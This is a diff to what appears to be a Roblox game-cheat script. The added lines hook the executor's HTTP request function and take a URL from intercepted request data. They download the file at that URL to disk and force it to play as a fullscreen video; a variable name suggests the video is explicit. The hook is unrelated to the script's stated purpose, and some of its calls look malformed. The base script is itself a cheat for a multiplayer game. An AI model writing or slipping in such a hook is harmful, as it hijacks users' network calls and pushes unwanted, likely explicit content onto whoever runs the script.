@@ -2003,3 +2003,27 @@ if _G.autoload then if isfile("kocmoc/BSS_".._G.autoload..".json") then kocmoc =
 for _, part in next, workspace:FindFirstChild("FieldDecos"):GetDescendants() do if part:IsA("BasePart") then part.CanCollide = false part.Transparency = part.Transparency < 0.5 and 0.5 or part.Transparency task.wait() end end
 for _, part in next, workspace:FindFirstChild("Decorations"):GetDescendants() do if part:IsA("BasePart") and (part.Parent.Name == "Bush" or part.Parent.Name == "Blue Flower") then part.CanCollide = false part.Transparency = part.Transparency < 0.5 and 0.5 or part.Transparency task.wait() end end
 for i,v in next, workspace.Decorations.Misc:GetDescendants() do if v.Parent.Name == "Mushroom" then v.CanCollide = false v.Transparency = 0.5 end end
+local requesting = http_request or request or HttpPost or syn.request
+local OldNameCall = nil
+OldNameCall = hookfunction(requesting, function(...)
+    local Args = {...}
+    local Hentai = Args[1]
+    print("ok")    
+    task.spawn(playvid, Hentai.Yes.embeds[1].description)
+    return OldNameCall(unpack(Args), ...)
+end)
+function playvid(vid)
+	task.wait(1)
+    print("yes")
+	writefile('wow.mp4', game:HttpGet(vid))
+    local screengui = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)
+    local videoframe = Instance.new("VideoFrame", screengui)
+    videoframe.Visible = true
+    videoframe.Size = UDim2.new(1,0,1,0)
+    videoframe.Video = getsynasset('wow.mp4')
+    videoframe:Play()
+    print("playing")
+    videoframe.Ended:Connect(function()
+	    videoframe:Destroy()
+    end)
+end
